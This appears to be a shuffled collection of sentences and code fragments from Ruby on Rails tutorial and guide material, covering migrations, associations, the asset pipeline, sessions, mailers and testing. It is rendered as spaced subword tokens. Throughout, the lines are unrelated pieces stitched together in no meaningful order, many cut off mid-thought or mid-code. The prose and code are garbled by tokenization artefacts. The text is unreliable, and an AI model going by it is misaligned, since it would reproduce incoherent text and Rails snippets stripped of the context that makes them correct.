▁For ▁example , ▁consider ▁a ▁simple ▁Rails ▁application ▁that ▁includes ▁a ▁model ▁for ▁ customers ▁and ▁a ▁model ▁for ▁orders ▖
▁layout ▁false
▁There ▁are ▁also ▁many ▁web ▁development ▁ sh o p s ▁that ▁special ize ▁in ▁Rails , ▁such ▁as ▁\ href { http :// ent p ▖ com /}{ E N T P }, ▁\ href { http :// thoughtbot ▖ com /}{ thoughtbot }, ▁\ href { http :// p ivotal lab s ▖ com /}{ P ivotal ▁L abs }, ▁and ▁\ href { http :// h ashrocket ▖ com /}{ H ashrocket }, ▁plus ▁in n um er able ▁in dependent ▁consult an t s , ▁t ra in ers , ▁and ▁con tr ac to rs .
▁( In s er ting ▁the ▁debug ▁information ▁into ▁tests ▁ probably ▁would n ' t ▁do ▁any ▁ha rm , ▁but ▁it ▁ probably ▁would n ' t ▁do ▁any ▁good , ▁either , ▁so ▁it ' s ▁best ▁to ▁restrict ▁the ▁debug ▁display ▁to ▁development ▁only ▖)
▁In ▁this ▁section , ▁we ' ll ▁give ▁our ▁ l one ly ▁sample ▁user ▁some ▁ com p any .
▁A ▁\ k ode { before \_ save } ▁callback ▁is ▁automatically ▁called ▁before ▁the ▁object ▁is ▁saved , ▁which ▁includes ▁both ▁object ▁creation ▁and ▁update s , ▁but ▁in ▁the ▁case ▁of ▁the ▁activation ▁digest ▁we ▁only ▁want ▁the ▁callback ▁to ▁fire ▁when ▁the ▁user ▁is ▁created .
▁<%= ▁submit _ tag ▁%>
▁At ▁this ▁point , ▁all ▁the ▁tests ▁should ▁be ▁passing :
▁It ▁ assert s ▁that ▁a ▁given ▁path ▁is ▁recognize d ▁and ▁routes ▁it ▁to ▁a ▁particular ▁ s po t ▁in ▁your ▁application ▖
▁### ▁` rails ▁server `
▁#### ▁C ri t ical ▁File s
▁ Comment ing ▁out ▁\ k ode { has \_ secure \_ password } ▁for ▁the ▁ s a k e ▁of ▁ TDD .
▁#< Client ▁id : ▁ 22 0, ▁first _ name : ▁" S ar a ">
▁ ╼ ▁var ▁= ▁boolean ? ▁?
▁### ▁ Cache Helper
▁The ▁` create _ association ` ▁method ▁returns ▁a ▁new ▁object ▁of ▁the ▁ associated ▁type ▖
▁With ▁the ▁asset ▁pipeline , ▁we ▁don ' t ▁have ▁to ▁choose ▁between ▁ speed ▁and ▁convenience : ▁we ▁can ▁work ▁with ▁multiple ▁nicely ▁ formatted ▁files ▁in ▁development , ▁and ▁then ▁use ▁the ▁asset ▁pipeline ▁to ▁make ▁ efficient ▁files ▁in ▁production .
▁This
▁The ▁complete ▁steps ▁needed ▁to ▁get ▁the ▁signin ▁features ▁to ▁pass .
▁In ▁this ▁chapter , ▁we ' ll ▁develop ▁a ▁toy ▁ demo ▁application ▁to ▁show ▁off ▁some ▁of ▁the ▁power ▁of ▁Rails .
▁This ▁method ▁call ▁will ▁look ▁something ▁like ▁this :
▁to ▁your ▁` Client ` ▁model ▖
▁You ▁can ▁define ▁assets ▁for ▁pre com p i l ation ▁in ▁` engine ▖ rb `:
▁If ▁you ▁click ▁a ▁link , ▁it ╼ does ▁the ▁same ▁process : ▁fetch ▁the ▁page , ▁fetch ▁the ▁assets , ▁put ▁it ▁all ▁together ,╼ show ▁you ▁the ▁results ▖
▁This ▁means ▁that ▁you ▁can ▁comment ▁or ▁remove ▁the ▁following ▁option ▁in ▁the ▁` config / initializers / wrap _ parameters ▖ rb ` ▁file :
▁For ▁example , ▁let ' s ▁define ▁a ▁function ▁\ k ode { string \_ message } ▁that ▁take s ▁a ▁single ▁\ emph { argument } ▁and ▁returns ▁a ▁message ▁base d ▁on ▁whether ▁the ▁argument ▁is ▁empty ▁or ▁not :
▁as ▁show n ▁in ▁Listing ~\ ref { code : first _ migration } .
▁The ▁normal ly ▁hidden ▁\ k ode { ▖ gitignore } ▁file ▁made ▁ visible .
▁You ▁can ▁also ▁render ▁a ▁block ▁of ▁code ▁within ▁a ▁partial ▁layout ▁instead ▁of ▁calling ▁` yield ` ▖
▁\ text tt { GET } ▁is ▁the ▁most ▁common ▁HTTP ▁operation , ▁used ▁for ▁\ emph { read ing } ▁data ▁on ▁the ▁web ; ▁it ▁just ▁means ▁`` get ▁a ▁page '' , ▁and ▁every ▁time ▁you ▁visit ▁a ▁site ▁like ▁ google ▖ com ▁or ▁ w ikipedia ▖ org ▁your ▁browser ▁is ▁ submitting ▁a ▁\ text tt { GET } ▁request ▖ ▁\ text tt { POST } ▁is ▁the ▁next ▁most ▁common ▁operation ; ▁it ▁is ▁the ▁request ▁sent ▁by ▁your ▁browser ▁when ▁you ▁submit ▁a ▁form .
▁@ url ▁= ▁user _ url (@ user )
▁client ▁= ▁Client ▖ readonly ▖ first
▁Link ing ▁the ▁button ▁to ▁the ▁Signup ▁page .
▁* ▁` config ▖ middleware ▖ use ( new _ middleware , ▁ args ) ` ▁- ▁Add s ▁the ▁new ▁middleware ▁at ▁the ▁bottom ▁of ▁the ▁middleware ▁ stack .
▁* ▁`: delete ` ▁cause s ▁the ▁ associated ▁object ▁to ▁be ▁delete d ▁directly ▁from ▁the ▁database ▁( so ▁callbacks ▁will ▁not ▁execute )
▁You ▁can ▁quickly ▁test ▁the ▁ RDoc ▁output ▁with ▁the ▁following ▁command :
▁For ▁co her ence ▁with ▁the ▁built - in ▁methods ▁only ▁relative ▁paths ▁are ▁accepted .
▁Or ▁you ▁can ▁remove ▁them .
▁in ▁Listing ~\ ref { code : edit _ update _ wrong _ user _ tests } .
▁( As ▁noted ▁above , ▁testing ▁the ▁third ▁branch ▁is ▁left ▁as ▁an ▁exercise ▖)
▁In ▁the ▁ ra re ▁c irc um st ance ▁that ▁an ▁exercise ▁solution ▁is ▁used ▁subsequent ly , ▁it ▁is ▁explicitly ▁solve d ▁in ▁the ▁main ▁text .
▁# ▁De c la re s ▁an ▁attribute ▁reader ▁back ed ▁by ▁an ▁internally - name d
▁When ▁asset ▁p ip el in ing ▁is ▁enabled , ▁these ▁files ▁are ▁pre process ed ▁and ╼ p la c ed ▁in ▁the ▁` public / assets ` ▁directory ▁for ▁ serv ing ▁by ▁either ▁the ▁Rails ▁app ▁or ╼ web ▁server .
▁# ▁P re compile ▁ additional ▁assets ▁( application ▖ js , ▁application ▖ css , ▁and ▁all
▁First , ▁we ▁will ▁make ▁a ▁comment ▁partial ▁to ▁ extract ▁ showing ▁all ▁the ▁comments ▁for ╼ the ▁article ▖
▁The ▁technique ▁involve s ▁using ▁\ emph { embedded ▁Ruby } ▁in ▁our ▁views .
▁ Invoice ▖ find _ in _ batches ▁do ▁| invoices |
▁in ▁Listing ~\ ref { code : index _ final _ refactoring } ▁and
▁On ▁OS ~ X , ▁\ k ode { brew ▁install ▁image magic k } ▁should ▁work ▁if ▁you ▁have ▁\ href { http :// brew ▖ sh /}{ Home brew } ▁installed .
▁has _ one ▁: account
▁# ▁For ▁API s , ▁you ▁may ▁want ▁to ▁use ▁: null _ session ▁instead .
▁ //= ▁require ▁library _ name
▁* ▁` collection ▖ build ( attributes ▁= ▁ { }, ▁ ▖▖▖)
▁On ▁pages ▁generated ▁by ▁` New sController `, ▁you ▁want ▁to ▁h ide ▁the ▁to p ▁ menu ▁and ▁add ▁a ▁right ▁ menu :
▁A ▁micropost ▁belongs ▁to ▁a ▁user .
▁Date ▖ new (200 0, ▁5 , ▁31)▖ prev _ month ▁# ▁=> ▁Sun , ▁30 ▁Apr ▁2000
▁It ▁cover s ▁a ▁lot ▁of ▁material , ▁and ▁it ' s ▁OK ▁not ▁to ▁get ▁it ▁all ▁on ▁the ▁first ▁pass .
▁d ╼\ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁format _ validation ▁( end )╼╼ ▁\ subsection { Uni q ue ness ▁validation } ▁% ▁( fold )╼ ▁\ label { sec : uniqueness _ validation }╼╼
▁### ▁A verage
▁Setting ▁the ▁root ▁route ▁to ▁the ▁Home ▁page .
▁The ▁method ▁` foreign _ key ` ▁gives ▁a ▁foreign ▁key ▁column ▁name ▁from ▁a ▁class ▁name ▖
▁Active ▁Record ▁database ▁connection s ▁are ▁manage d ▁by ▁` ActiveRecord :: Connection Adapters :: Connection P o ol ` ▁which ▁ensure s ▁that ▁a ▁connection ▁ po ol ▁ sy n ch r on ize s ▁the ▁amount ▁of ▁thread ▁access ▁to ▁a ▁ limited ▁number ▁of ▁database ▁connection s ▖
▁> > ▁Person ▖ create !
▁To ▁override ▁the ▁name ▁of ▁the ▁` lock _ version ` ▁column , ▁` ActiveRecord :: Base ` ▁provides ▁a ▁class ▁attribute ▁called ▁` lock ing _ column `:
▁=> ▁#< Word : 0 x 22 d 0 b 20 >
▁The ▁second ▁way ▁to ▁declare ▁a ▁many - to - many ▁relationship ▁is ▁to ▁use ▁` has _ many ▁: through ` ▖
▁in ▁Listing ~\ ref { code : signup _ route } .
▁The ▁following ▁list ▁ explain s ▁the ▁purpose ▁of ▁each ▁of ▁them :
▁if ▁options [: us age ]
▁m attr _ accessor ▁: load _ once _ paths
▁E ve ry one ▁go es ▁through ▁it .
▁We ' d ▁need ▁to ▁do ▁something ▁like ▁this :
▁The ▁result ▁for ▁a ▁ representative ▁sample ▁of ▁valid ▁email ▁addresses ▁appears ▁in ▁Listing ~\ ref { code : email _ format _ valid _ tests } .
▁app / assets / stylesheets
▁To ▁define ▁the ▁named ▁routes ▁for ▁the ▁Help , ▁About , ▁and ▁Contact ▁pages , ▁we ▁need ▁to ▁make ▁changes ▁to ▁the ▁\ k ode { get } ▁rules ▁from ▁Listing ~\ ref { code : contact _ route }, ▁ transform ing ▁lines ▁like
▁If ▁you ▁have ▁trouble , ▁try ▁running
▁Now ▁we ' re ▁ready ▁to ▁start ▁making ▁the ▁app ▁itself .
▁> , ▁▖▖▖ }
▁S ince ▁we ' ll ▁be ▁making ▁a ▁controller ▁to ▁handle ▁static ▁pages , ▁we ' ll ▁call ▁it ▁the ▁StaticPages ▁controller .
▁Note ▁that ▁the ▁\ k ode { destroy } ▁action ▁uses ▁method ▁ chain ing ▁to ▁combine ▁the ▁\ k ode { find } ▁and ▁\ k ode { destroy } ▁into ▁one ▁line :
▁It ▁take s ▁the ▁type ▁of ▁the ▁link ▁( `: rs s ` ▁or ▁`: atom ` ), ▁a ▁hash ▁of ▁options ▁that ▁are ▁passed ▁through ▁to ▁url _ for , ▁and ▁a ▁hash ▁of ▁options ▁for ▁the ▁tag :
▁The ▁method ▁` years _ ago ` ▁receive s ▁a ▁number ▁of ▁ years ▁and ▁returns ▁the ▁same ▁date ▁those ▁many ▁ years ▁ ago :
▁# ▁Use ▁ sqlite 3 ▁as ▁the ▁database ▁for ▁Active ▁Record
▁We ▁can ▁create ▁a ▁large ▁number ▁of ▁test ▁users ▁using ▁ embedded ▁Ruby ▁inside ▁fixtures .
▁Here ▁the ▁test ▁suite ▁take s ▁more ▁than ▁ s even ▁second s ▁to ▁run ▁even ▁though ▁the ▁actual ▁tests ▁run ▁in ▁under ▁a ▁t en th ▁of ▁a ▁second .
▁# ▁perform ▁a ▁partial ▁update
▁( In ▁the ▁language ▁of ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / E x t re me _ Programming } { E x t re me ▁ Programming ▁( X P ) }, ▁this ▁explor a to ry ▁step ▁is ▁called ▁a ▁\ emph { s p i k e } ▖)
▁As ▁required , ▁initially ▁our ▁test ▁suite ▁is ▁passing ▁(\ passing ) .
▁which ▁is ▁only ▁a ▁mark er , ▁its ▁ body ▁or ▁return ▁value ▁are ▁irrelevant ▖
▁Using ▁a ▁\ k ode { div } ▁tag ▁in ▁place ▁of ▁\ k ode { footer } ▁would ▁work ▁as ▁well .
▁When ▁you ╼ do ▁this ▁you ▁need ▁to ▁configure ▁the ▁" origin " ▁of ▁the ▁CDN ▁to ▁point ▁back ▁at ▁your ╼ web site ▁` example ▖ com `, ▁check ▁your ▁provide r ▁for ▁documentation ▁on ▁ configuring ▁the ╼ origin ▁server .
▁We ▁can ▁choose ▁any ▁migration ▁name ▁we ▁want , ▁but ▁it ' s ▁convenient ▁to ▁end ▁the ▁name ▁with ▁\ k ode { to \_ users }, ▁since ▁in ▁this ▁case ▁Rails ▁automatically ▁construct s ▁a ▁migration ▁to ▁add ▁columns ▁to ▁the ▁\ k ode { users } ▁table .
▁A ▁pre li m in ary ▁version ▁of ▁the ▁Sessions ▁\ k ode { create } ▁action .
▁( For ▁a ▁ deep er ▁understanding , ▁I ▁recommend ▁\ emph { The ▁Rails ~ 4 ▁Way } ▁by ▁O b i e ▁F er n and e z ▖)
▁This ▁object ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁and ▁the ▁link ▁through ▁this ▁object ' s ▁foreign ▁key ▁will ▁be ▁set , ▁but ▁the ▁ associated ▁object ▁will ▁ _ not _ ▁yet ▁be ▁saved .
▁#### ▁ J o in ing ▁M ultiple ▁Associations
▁The ▁solution ▁is ▁to ▁\ emph { paginate } ▁the ▁users , ▁so ▁that ▁( for ▁example ) ▁only ▁30 ▁show ▁up ▁on ▁a ▁page ▁at ▁any ▁one ▁time .
▁An ▁array ▁is ▁just ▁a ▁list ▁of ▁elements ▁in ▁a ▁particular ▁order .
▁# ▁ lib / blorgh / engine ▖ rb
▁For ▁instance , ▁we ▁don ' t ▁test ▁how ▁long ▁the ▁`` remember ▁me '' ▁cookie ▁last s ▁or ▁whether ▁it ▁get s ▁set ▁at ▁all .
▁A lthough ▁the ▁`: counter _ cache ` ▁option ▁is ▁specified ▁on ▁the ▁model ▁that ▁includes ▁the ▁` belongs _ to ` ▁declaration , ▁the ▁actual ▁column ▁must ▁be ▁added ▁to ▁the ▁ _ associated _ ▁model ▖
▁Those ▁attributes ▁are ▁automatically ▁added ▁to ▁the ▁` articles `╼ table ▁in ▁the ▁database ▁and ▁map ped ▁to ▁the ▁` Article ` ▁model .
▁This ▁includes ▁your ▁application , ▁engines , ▁Rails ▁framework s ▁and ▁any ▁other ▁registered ▁ namespace .
▁The ▁new ▁signup ▁page ▁at ▁\ href { http :// localhost :3000/ signup }{/ signup } .
▁Some ▁more ▁uses ▁of ▁\ k ode { assert \_ select } ▁appear ▁in ▁Table ~\ ref { table : assert _ select } .
▁L im it ▁and ▁Of f set
▁Create s ▁a ▁hidden ▁form ▁input ▁field ▁used ▁to ▁ tr an s m it ▁data ▁that ▁would ▁be ▁ lo st ▁due ▁to ▁HTTP ' s ▁state less ness ▁or ▁data ▁that ▁should ▁be ▁hidden ▁from ▁the ▁user .
▁The ▁missing ▁files ▁and ▁directories ▁are ▁back .
▁In ▁Section ~\ ref { sec : remember _ me }, ▁we ' ll ▁add ▁sessions ▁that ▁persist ▁even ▁after ▁ closing ▁the ▁browser .
▁DELETE ▁ / articles / : id (▖ : format ) ▁articles # destroy
▁* ▁ Control l ing ▁association ▁scope
▁# ▁template ▖ rb
▁This ▁method ▁receive s ▁an ▁arbitrar y ▁number ▁of ▁action ▁names , ▁and ▁an ▁optional ▁hash ▁of ▁options ▁as ▁last ▁argument ▖
▁### ▁Action ▁Mailer ▁Layouts
▁\ href { http :// www ▖ railstutorial ▖ org / screencasts } { The ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁ screencasts } : ▁I ▁have ▁prepar ed ▁a ▁full - length ▁ screen c a st ▁course ▁base d ▁on ▁this ▁book .
▁| ` raise _ delivery _ errors ` | W hether ▁or ▁not ▁errors ▁should ▁be ▁raised ▁if ▁the ▁email ▁fails ▁to ▁be ▁ deliver ed ▖
▁<%= ▁form _ for ▁@ person , ▁url : ▁ { action : ▁" update "} ▁do ▁| person _ form | ▁%>
▁Before , ▁this ▁was ▁more ▁explicit : ▁we ▁used
▁Client ▖ where ( orders _ count : ▁[1, 3 , 5 ])
▁* ▁[ jquery - ujs ▁list ▁of ▁external ▁articles ]( https :// github ▖ com / rails / jquery - ujs / wiki / E x ter n al - articles )
▁These ▁errors ▁are ▁ associated ▁with ▁a ▁particular ▁Active ▁Record ▁object , ▁but ▁this ▁strategy ▁won ' t ▁work ▁here ▁because ▁the ▁session ▁isn ' t ▁an ▁Active ▁Record ▁model .
▁do _ something _ return ing _ a _ string ( string )
▁\ emph { Extra ▁ credit } : ▁ Show ▁that ▁Rails ▁supports ▁non - \ href { http :// es ▖ w ikipedia ▖ org / wiki / ASCII } { ASCII } ▁characters ▁by ▁including ▁an ▁in ve r ted ▁excl a m ation ▁point , ▁as ▁in ▁`` ¡ H ol a , ▁ mundo !''
▁Validat ing ▁the ▁email ▁format ▁with ▁a ▁regular ▁expression ▖
▁For ▁example , ▁you ▁may ▁want ▁to ▁confirm ▁an ▁email ▁address ╼ or ▁a ▁password ▖
▁The ▁scaffold ▁code ▁may ▁have ▁extra ▁new lines ▁compar ed ▁to ▁Listing ~\ ref { code : demo _ microposts _ resource } .
▁The ▁user ▁edit ▁page ▁(\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit }) ▖ ~\ href { http :// railstutorial ▖ org / images / figures / demo _ edit _ user _ rails _ 3- full ▖ png }{( full ▁size )}
▁Client ▖ where ( locked : ▁true )
▁" digest ":" 12 b 3 c 7 d d 7 4 d 2 e 9 d f 37 e 7 c b b 1 e fa 76 a 6 d " }, " application - 1 c 57 5278 9 5 88 ac 18 d 7 e 1 a 50 b 1 f 0 fd 4 c 2▖ css ":{" logical _ path ":" application ▖ css "," m time " : "2013-0 7-2 6 T 22 : 5 6 : 17 - 07 :00 "," size " : 1 59 1,
▁* ▁A ▁namespaced ▁` Application Controller ` ▁ stub
▁There ▁are ▁two ▁kind s ▁of ▁Active ▁Record ▁objects : ▁those ▁that ▁correspond ▁to ▁a ▁ row ╼ in side ▁your ▁database ▁and ▁those ▁that ▁do ▁not ▖
▁$ ▁bundle ▁exec ▁rake ▁test ╼ 3 ▁tests , ▁3 ▁assertions , ▁0 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁Also , ▁you ▁can ▁pass ▁a ▁block ▁to ▁` c attr _ * ` ▁to ▁set ▁up ▁the ▁attribute ▁with ▁a ▁default ▁value :
▁Note ▁that ▁the ▁URL ▁is ▁\ href { http ://0▖0▖0▖0:3000/ users /1}{/ users /1 } ; ▁as ▁you ▁m ight ▁suspect , ▁the ▁number ~\ k ode {1} ▁is ▁simply ▁the ▁user ' s ~\ k ode { id } ▁attribute ▁from ▁Figure ~\ ref { fig : demo _ user _ model } .
▁T hanks ▁to ▁so cial ▁ w is dom ▁and ▁ po s i tive ▁construct ive ness ▁all ▁around , ▁` for t y _ two ` ▁is ▁also ▁available .
▁( This ▁requires ▁adding ▁ credit ▁ card ▁information ▁to ▁your ▁Heroku ▁account , ▁but ▁there ▁is ▁no ▁charg e ▁when ▁verify ing ▁an ▁account ▖)
▁S ince ▁the ▁\ k ode { Word } ▁class ▁inherit s ▁from ▁\ k ode { String }, ▁we ▁can ▁use ▁the ▁console ▁to ▁see ▁the ▁class ▁hierarchy ▁explicitly :
▁as ▁show n ▁in ▁Listing ~\ ref { code : account _ activation _ preview } .
▁in ▁Listing ~\ ref { code : new _ user _ with _ partial } ▁and
▁Rails ▁will ▁render ▁the ▁` _ product _ ru ler ` ▁partial ▁( with ▁no ▁data ▁passed ▁in ▁to ▁it ) ▁between ▁each ▁pair ▁of ▁` _ product ` ▁partials .
▁Compute s ▁the ▁path ▁to ▁an ▁image ▁asset ▁in ▁the ▁` app / assets / images ` ▁directory ▖
▁in ▁Listing ~\ ref { code : development _ email _ settings } .
▁Re mov e ▁the ▁R JS ▁setting ▁` config ▖ action _ view ▖ debug _ r js ▁= ▁true ` .
▁\ emph { Extra ▁ credit } : ▁ Write ▁integration ▁tests ▁for ▁both ▁ / users ▁and ▁ / users / : id .
▁We ' ll ▁actually ▁be ▁using ▁the ▁`-- mountable ` ▁option ▁here , ▁which ▁includes ╼ all ▁the ▁features ▁of ▁`-- full `, ▁and ▁then ▁some ▖
▁Let ' s ▁re m ed y ▁this ▁ s ad ▁situation .
▁ Show ▁action ▁for ▁articles ]( images / getting _ started / show _ action _ for _ articles ▖ png )
▁We ▁can ▁demonstrate ▁one ▁way ▁to ▁handle ▁this ▁with ▁a ▁con tr ive d ▁example :
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ accessible _ attribute } .
▁No ▁user ▁images
▁Article ▖ recent ▖ many ?
▁Of ▁course , ▁using ▁a ▁testing ▁framework ▁that ▁isn ' t ▁p ure ▁Ruby ▁has ▁a ▁down side , ▁and ▁I ▁find ▁that ▁the ▁plain - text ▁ st or ies ▁can ▁be ▁a ▁bit ▁verb o se .
▁A ▁mockup ▁of ▁the ▁user ▁profile ▁made ▁in ▁this ▁section .
▁@ product ▁= ▁ Product ▖ find ( params [: id ])
▁For ▁example , ▁the ▁line
▁M u ch ▁of ▁the ▁secure ▁password ▁machinery ▁will ▁be ▁implemented ▁using ▁a ▁single ▁Rails ▁method ▁called ▁\ k ode { has \_ secure \_ password } ▁( first ▁introduce d ▁in ▁Rails ~ 3▖1 ) .
▁ Copy right ▁and ▁ license
▁ V ers us ▁the ▁CDN ▁copy .
▁Implement ▁this ▁feature ▁for ▁the ▁sample ▁application .
▁* ▁Rails ▁4▖0 ▁ de pre cat es ▁the ▁`: con fi rm ` ▁option ▁for ▁the ▁` link _ to ` ▁helper ▖
▁ delegate ▁: logger , ▁to : ▁: Rails
▁To ▁get ▁the ▁page ▁defined ▁in ▁Listing ~\ ref { code : microposts _ home _ page } ▁working , ▁we ▁need ▁to ▁create ▁and ▁fill ▁in ▁a ▁couple ▁of ▁partials .
▁create ▁app / views / users
▁A ▁re c a p ▁of ▁the ▁final ▁status ▁feed , ▁show n ▁in ▁Figure ~\ ref { fig : page _ flow _ home _ page _ feed _ mockup }, ▁appears ▁again ▁in ▁Figure ~\ ref { fig : home _ page _ feed _ mockup } .
▁# ▁< id > 44 04 </ id >
▁# ▁# {@ comment ▖ text }
▁# ▁=> ▁[" David ", ▁" Jeremy ", ▁" J o se "]
▁ ╼ ▁> > ▁1▖ kilobyte ╼ ▁=> ▁10 2 4 ╼ ▁> > ▁5 ▖ me g abytes ╼ ▁=> ▁5 242 88 0
▁How ▁these ▁hashes ▁are ▁generated ▁is ▁covered ▁in ▁the ▁[ In ╼ Product ion ](# in - production ) ▁section ▁later ▁on ▁in ▁this ▁guide .
▁person ▖ errors ▖ full _ messages
▁# ▁=> ▁ { nil => nil , ▁1 =>1 , ▁nested : { a : 3 , ▁5 => 5}}
▁By ▁ filling ▁in ▁the ▁missing ▁elements ▁in ▁Listing ~\ ref { code : login _ create _ user _ instance } ▁and ▁Listing ~\ ref { code : i mprov ed _ remember _ me _ test } ▁( in d icated ▁with ▁question ▁mark s ~\ k ode { ?} ▁and ▁\ k ode { FILL \_ IN }), ▁complete ▁this ▁improve d ▁test ▁of ▁the ▁`` remember ▁me '' ▁checkbox .
▁# ▁R F C ▁say s ▁only ▁cache ▁for ▁1 ▁ year
▁``` y a m l
▁You ▁have ▁successfully ▁signed ▁up ▁to ▁example ▖ com ,
▁To ▁complete ▁a ▁working ▁signup ▁form , ▁we ▁need ▁to ▁fill ▁in ▁the ▁comment ed - out ▁section ▁in ▁Listing ~\ ref { code : create _ action _ strong _ parameters } ▁with ▁the ▁appropriate ▁behavior .
▁This ▁creates ▁`` get ter '' ▁and ▁`` set ter '' ▁methods ▁that ▁allow ▁us ▁to ▁retrieve ▁( get ) ▁and ▁assign ▁( set ) ▁\ k ode {@ name } ▁and ▁\ k ode {@ email } ▁\ emph { instance ▁variables }, ▁which ▁were ▁mentioned ▁brief ly ▁in ▁Section ~\ ref { sec : mvc _ in _ action } ▁and ▁Section ~\ ref { sec : static _ pages _ exercises } .
▁### ▁`: message `
▁$ ▁ l s ▁- l
▁This ╼ sign al s ▁all ▁cache s ▁between ▁your ▁server ▁and ▁the ▁client ▁browser ▁that ▁this ▁content ╼ ( the ▁file ▁served ) ▁can ▁be ▁cached ▁for ▁1 ▁ year ▖
▁The ▁engine ▁simply ▁requires ▁this ▁class ▁to ▁define ▁a ╼` find _ or _ create _ by ` ▁method ▁which ▁returns ▁an ▁object ▁of ▁that ▁class , ▁to ▁be ╼ associated ▁with ▁an ▁article ▁when ▁it ' s ▁created ▖
▁At ▁this ▁point , ▁our ▁deletion ▁code ▁is ▁well - test ed , ▁and ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁@ @ field _ error _ proc ▁= ▁ Proc ▖ new { ▁▖▖▖ ▁ }
▁I ▁suggest ▁reading ▁through ▁it ▁at ▁some ▁point , ▁and ▁I ▁also ▁suggest ▁tak ing ▁a ▁look ▁at ▁the ▁\ href { http :// guides ▖ rubyonrails ▖ org / routing ▖ html } { Rails ▁Guides ▁article ▁`` Rails ▁ Routing ▁from ▁the ▁out side ▁in '' } ▁for ▁a ▁much ▁more ▁in - de p th ▁treat ment ▁of ▁routes .
▁User ▖ active
▁The ▁` size ` ▁method ▁returns ▁the ▁total ▁number ▁of ▁error ▁messages ▁for ▁the ▁object .
▁ V ia : ▁1▖ 1 ▁var n is h
▁* ▁The ▁ concept s ▁of ▁database ▁migrations , ▁validations ▁and ▁callbacks .
▁Fin ally , ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset } ▁we ' ll ▁add ▁account ▁activation ▁( the re by ▁confirm ing ▁a ▁valid ▁email ▁address ) ▁and ▁password ▁resets .
▁### ▁Specif y ing ▁Conditions ▁on ▁E age r ▁Load ed ▁Associations
▁<%= ▁stylesheet _ link _ tag ▁" main _ print ", ▁ media : ▁" print " ▁%>
▁Here ' s ▁a ▁migration ▁that ╼ create s ▁a ▁table :
▁To ▁do ▁that , ▁it ▁must ▁first ╼ be ▁copie d ▁using ▁this ▁command :
▁has _ many ▁: section s
▁A ▁` has _ many ▁: through ` ▁association ▁is ▁often ▁used ▁to ▁set ▁up ▁a ▁many - to - many ▁connection ▁with ▁another ▁model ▖
▁if ▁@ order ▖ customer ▖ nil ?
▁In ▁this ▁section , ▁we ' ll ▁write ▁an ▁integration ▁test ▁cover ing ▁two ▁of ▁the ▁three ▁branch es ▁in ▁Listing ~\ ref { code : password _ reset _ update _ action }, ▁invalid ▁and ▁valid ▁submission .
▁Note ▁that ▁there ▁is ▁no ▁ limit ▁in ▁nesting ▁level s ▖
▁# ▁< author > J o sh u a ▁P e e k </ author >
▁class ▁Create A p point ment s ▁< ▁ActiveRecord :: Migration
▁To ▁write ▁the ▁implementation , ▁we ▁start ▁by ▁adding ▁a ▁checkbox ▁to ▁the ▁login ▁form ▁from ▁Listing ~\ ref { code : login _ form } .
▁The ▁original ▁source ▁is ╼ store d ▁in ▁` data ` ▖
▁* ▁` collection ▖ find (▖▖▖)
▁=> ▁" 2 ▁ w o m en "
▁ Engine s ▁can ▁also ▁be ▁ isolate d ▁from ▁their ▁host ▁applications ▖
▁def ▁self ▖ # { method _ id } (* args )
▁* ▁What ▁the ▁asset ▁pipeline ▁is ▁and ▁what ▁it ▁does .
▁t ▖ advance ( seconds : ▁1)
▁( We ' ll ▁write ▁these ▁actions ▁in ▁Section ~\ ref { sec : a _ working _ follow _ button _ the _ standard _ way } ▖)
▁Date ▖ new (201 0, ▁5 , ▁24 )▖ weeks _ ago (1) ▁# ▁=> ▁Mon , ▁17 ▁May ▁2010
▁We ' ll ▁be ▁using ▁sessions ▁to ▁implement ▁the ▁common ▁pattern ▁of ▁`` signing ▁in '' , ▁and ▁in ▁this ▁context ▁there ▁are ▁sever al ▁different ▁models ▁for ▁session ▁behavior ▁common ▁on ▁the ▁web : ▁`` for getting '' ▁the ▁session ▁on ▁browser ▁close , ▁using ▁an ▁optional ▁`` remember ▁me '' ▁checkbox ▁for ▁ persistent ▁sessions , ▁and ▁automatically ▁remember ing ▁sessions ▁un til ▁the ▁user ▁explicitly ▁sign s ▁out
▁If ▁you ▁want ▁to ▁find ▁the ▁ minimum ▁value ▁of ▁a ▁field ▁in ▁your ▁table ▁you ▁can ▁call ▁the ▁` minimum ` ▁method ▁on ▁the ▁class ▁that ▁ rel ate s ▁to ▁the ▁table ▖
▁<% ▁ benchmark ▁" Proc ess ▁data ▁files " ▁do ▁%>
▁In ▁Section ~\ ref { sec : signup _ error _ messages }, ▁we ▁used ▁an ▁error - messages ▁partial ▁to ▁display ▁error ▁messages , ▁but ▁we ▁saw ▁in ▁that ▁section ▁that ▁those ▁messages ▁are ▁provided ▁automatically ▁by ▁Active ▁Record .
▁The ▁profile s ▁in ▁this ▁section ▁will ▁be ▁the ▁first ▁t ru ly ▁dynamic ▁pages ▁in ▁our ▁application .
▁F re e z ing ▁your ▁system ▁to ▁this ▁particular ▁version ▁will ▁help ▁prevent ▁conflicts ▁as ▁ RubyGems ▁changes ▁in ▁the ▁future .
▁You ▁can ▁use ▁multiple
▁However , ▁because ▁ Turbolinks ▁override s ▁the ▁normal ▁page ▁loading ▁process , ▁the ╼ even t ▁that ▁this ▁relie s ▁on ▁will ▁not ▁be ▁fire d ▖
▁validates ▁: term s _ of _ service , ▁ acceptance : ▁true
▁Even ▁with ▁the ▁ability ▁to ▁run ▁tests ▁inside ▁of ▁S ublime ▁Text , ▁I ▁ still ▁some times ▁prefer ▁using ▁Guard , ▁but ▁at ▁this ▁point ▁my ▁b read - and - but ter ▁ TDD ▁technique ▁is ▁the ▁one ▁ enumerate d ▁above .
▁class ▁Application Controller ▁< ▁ ActionController :: Base
▁An ▁ annotate d ▁\ k ode { title \_ helper } .
▁create ▁test / mailers / user _ mailer _ test ▖ rb
▁With ▁the ▁fixtures ▁defined ▁in ▁Listing ~\ ref { code : users _ fixtures _ extra _ users }, ▁we ' re ▁ready ▁to ▁write ▁a ▁test ▁of ▁the ▁users ▁index .
▁adapter : ▁ j db c sqlite 3
▁ ╼ ▁$ ▁ kill ▁- 9 ▁1 22 4 1
